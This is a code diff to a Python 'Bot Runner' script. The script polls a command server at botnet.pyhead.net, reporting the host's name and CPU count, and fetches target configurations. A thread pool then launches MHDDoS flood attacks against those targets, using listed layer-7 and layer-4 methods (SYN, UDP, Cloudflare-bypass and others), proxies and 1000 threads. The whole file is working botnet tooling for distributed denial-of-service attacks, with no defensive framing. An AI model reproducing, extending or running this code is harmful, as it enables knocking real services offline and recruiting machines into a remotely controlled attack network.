@@ -3,17 +3,67 @@
 import json
 import subprocess
 import sys
-from time import sleep
 import psutil
 
-from logging import raiseExceptions
+from socket import gethostname
+from time import sleep
 from urllib.request import urlopen
 from threading import Thread
 from collections import namedtuple
+from pathlib import Path
+from logging import basicConfig, getLogger
+from queue import Queue
+
+import MHDDoS.start as MHDDoS
+
+basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
+            datefmt="%H:%M:%S")
+
+logger = getLogger("Bot Runner")
+logger.setLevel("INFO")
+
+url = f"https://botnet.pyhead.net/api/v2/tasks/json/?hostname={gethostname()};cpu_count={psutil.cpu_count()};"
+logger.info(f"The task {url=}")
 
 loop_time = 120
 
-url = "https://botnet.pyhead.net/api/v2/tasks/json/"
+
+class Worker(Thread):
+    """Thread executing tasks from a given tasks queue"""
+
+    def __init__(self, tasks):
+        Thread.__init__(self)
+        self.tasks = tasks
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        while True:
+            func, args, kargs = self.tasks.get()
+            try:
+                func(*args, **kargs)
+            except Exception as e:
+                print(e)
+            finally:
+                self.tasks.task_done()
+
+
+class ThreadPool:
+    """Pool of threads consuming tasks from a queue"""
+
+    def __init__(self, num_threads):
+        self.tasks = Queue(num_threads)
+        for _ in range(num_threads):
+            Worker(self.tasks)
+
+    def add_task(self, func, *args, **kargs):
+        """Add a task to the queue"""
+        self.tasks.put((func, args, kargs))
+
+    def wait_completion(self):
+        """Wait for completion of all the tasks in the queue"""
+        self.tasks.join()
+
 
 l7 = ["GET", "POST", "OVH", "STRESS", "DYN", "DOWNLOADER", "SLOW", "HEAD", "NULL", "COOKIE",
       "PPS", "EVEN", "GSB", "DGB", "AVB", "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB"]
@@ -23,9 +73,6 @@ l4 = ["TCP", "UDP", "SYN", "CPS", "CONNECTION", "VSE", "TS3",
 
 def customDecoder(Obj):
     return namedtuple('X', Obj.keys())(*Obj.values())
-
-
-params = []
 
 
 def runner(config):
@@ -62,16 +109,47 @@ def runner(config):
                 str(period)
             ]
         else:
-            raiseExceptions('No we cant run the LEVEL7 attacks without proxy.')
-    subprocess.run([sys.executable, "MHDDoS/start.py",
-                   *params], stdout=subprocess.PIPE)
+            logger.critical(
+                'No we cant run the LEVEL7 attacks without proxy. Skipping')
+    try:
+        subprocess.run([sys.executable, "MHDDoS/start.py", *params])
+    except KeyboardInterrupt:
+        logger.info("Shutting down... Ctrl + C")
+    except Exception as error:
+        logger.critical(f"OOPS... {config.Dst} -> Some issue: {error=}")
 
 
-while True:
-    for conf in json.loads(urlopen(url).read(), object_hook=customDecoder):
-        runner_thread = Thread(target=runner, args=(conf,))
-        runner_thread.start()
-        ps = psutil.getloadavg()
-        load = int(ps[0] / psutil.cpu_count() * 100)
-        if runner_thread.is_alive() or load > 80:
-            sleep(loop_time)
+if __name__ == '__main__':
+
+    try:
+        pool = ThreadPool(int(psutil.cpu_count() / 2) + 1)
+
+        MHDDoS.threads = 1000
+        proxy_config = json.load(open("MHDDoS/config.json"))
+
+        MHDDoS.handleProxyList(proxy_config, Path(
+            "MHDDoS/files/proxies/proxylist.txt"), 0, url=None)
+
+        while True:
+
+            logger.info("Getting fresh tasks from the server!")
+
+            for conf in json.loads(urlopen(url).read(), object_hook=customDecoder):
+
+                while int(psutil.cpu_percent()) > 70:
+                    logger.critical(
+                        "The CPU loag is to high. Thread waiting...")
+                    logger.info(
+                        f"Queue size: {pool.tasks.qsize()}, Next task {conf.Dst}")
+
+                pool.add_task(runner, conf)
+
+                logger.info(f"The system works good! Thanks :P ")
+                sleep(5)
+
+            pool.wait_completion()
+
+    except KeyboardInterrupt:
+        logger.info("Shutting down... Ctrl + C")
+    except Exception as error:
+        logger.critical(f"OOPS... We are faced with some issue: {error=}")
